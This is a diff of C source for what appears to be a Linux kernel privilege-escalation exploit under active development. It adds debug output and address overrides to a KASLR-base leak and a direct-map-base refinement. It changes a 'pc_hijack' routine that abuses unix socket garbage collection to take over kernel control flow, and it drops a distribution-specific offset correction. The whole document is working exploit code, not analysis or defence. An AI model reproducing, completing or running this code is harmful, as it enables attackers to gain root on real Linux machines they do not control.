@@ -2717,6 +2717,13 @@ static int run_oracle_mode(bool run_vertex_oracle)
 	kernel_base = leak_xdk_kaslr_base();
 	if (!kernel_base)
 		fail("kernelXDK KASLR leak did not reach a majority");
+	printf("[+] oracle: kernel base 0x%016llx (BEFORE override)\n",
+	       (unsigned long long)kernel_base);
+#ifdef KBASE_OVERRIDE
+	kernel_base = KBASE_OVERRIDE;
+	printf("[!] oracle: kernel_base OVERRIDDEN to 0x%016llx\n",
+	       (unsigned long long)kernel_base);
+#endif
 	printf("[+] oracle: kernel base 0x%016llx\n",
 	       (unsigned long long)kernel_base);
 
@@ -2735,6 +2742,13 @@ static int run_oracle_mode(bool run_vertex_oracle)
 	       (unsigned long long)anchor.pfn);
 	direct_map_base = refine_direct_map_base(
 		direct_map_base, anchor.pfn, anchor.mapping);
+	printf("[+] oracle: refined direct-map base 0x%016llx (BEFORE override)\n",
+	       (unsigned long long)direct_map_base);
+#ifdef DM_BASE_OVERRIDE
+	direct_map_base = DM_BASE_OVERRIDE;
+	printf("[!] oracle: dm_base OVERRIDDEN to 0x%016llx\n",
+	       (unsigned long long)direct_map_base);
+#endif
 	anchor.direct_map_address =
 		direct_map_base + anchor.pfn * KERNEL_PAGE_SIZE;
 	printf("[+] oracle: refined direct-map base 0x%016llx\n",
@@ -4928,9 +4942,6 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 	printf("[D] b_vertex addr=%#llx\n",
 	       (unsigned long long)b_vertex.address);
 	fflush(stdout);
-	printf("[GDB] set watchpoing now, sleep for 30s...\n");
-	fflush(stdout);
-	sleep(30);
 	release_packet_page_anchor(&eviction);
 	if (syscall(SYS_setresuid, 0, 0, 0) != 0)
 		die("restore root GC allocator identity");
@@ -5073,16 +5084,30 @@ static void run_pc_hijack_attempt(uint64_t kbase,
 		die("pc-hijack initial GC sentinel");
 	close(init_done[1]);
 	close(init_cycle[0]);
-	close(init_cycle[1]);
 	printf("[D] pre-sentinel: ab[1]=%d bb[1]=%d filler0=%d filler1=%d"
-	       " tp0=%d tp1=%d stall0=%d sig0=%d\n",
+	       " tp0=%d tp1=%d stall0=%d sig0=%d"
+	       " ic0=%d ic1=%d id0=%d\n",
 	       ab[1], bb[1], filler[0], filler[1],
 	       trigger_pressure[0], trigger_pressure[1],
-	       stall_sock[0], signal1[0]);
+	       stall_sock[0], signal1[0],
+	       init_cycle[0], init_cycle[1], init_done[0]);
+	fflush(stdout);
+	printf("[D] closing init_cycle[1] (fd=%d) — should trigger unix_gc\n",
+	       init_cycle[1]);
+	fflush(stdout);
+	close(init_cycle[1]);
+	usleep(500000);
+	printf("[D] after 500ms: signal1_hup=%d init_done_hup=%d\n",
+	       wait_pipe_hup(signal1[0], 0) == 0,
+	       wait_pipe_hup(init_done[0], 0) == 0);
 	fflush(stdout);
 	trigger_gc_once();
-	if (wait_pipe_hup(init_done[0], STAGE1_TIMEOUT_MSEC) != 0)
+	if (wait_pipe_hup(init_done[0], STAGE1_TIMEOUT_MSEC) != 0) {
+		printf("[D] FAILED: signal1_hup=%d\n",
+		       wait_pipe_hup(signal1[0], 0) == 0);
+		fflush(stdout);
 		fail("pc-hijack initial GC sentinel was not collected");
+	}
 	printf("[D] GC sentinel collected ok (signal1_hup=%d)\n",
 	       wait_pipe_hup(signal1[0], 0) == 0);
 	fflush(stdout);
@@ -6010,11 +6035,6 @@ static uint64_t leak_xdk_kaslr_base(void)
 {
 	uint64_t candidate = xdk_leak_kaslr_base(
 		38, KASLR_LEAK_SAMPLE_COUNT, KASLR_LEAK_TRIAL_COUNT);
-
-	/* Ubuntu maps the image's anomalous prefetch window one 16 MiB slot
-	 * before the relocated __START_KERNEL_map base used by our offsets. */
-	if (candidate)
-		candidate += 16 * MIB;
 
 	if (!candidate ||
 	    candidate < 0xffffffff81000000ULL ||
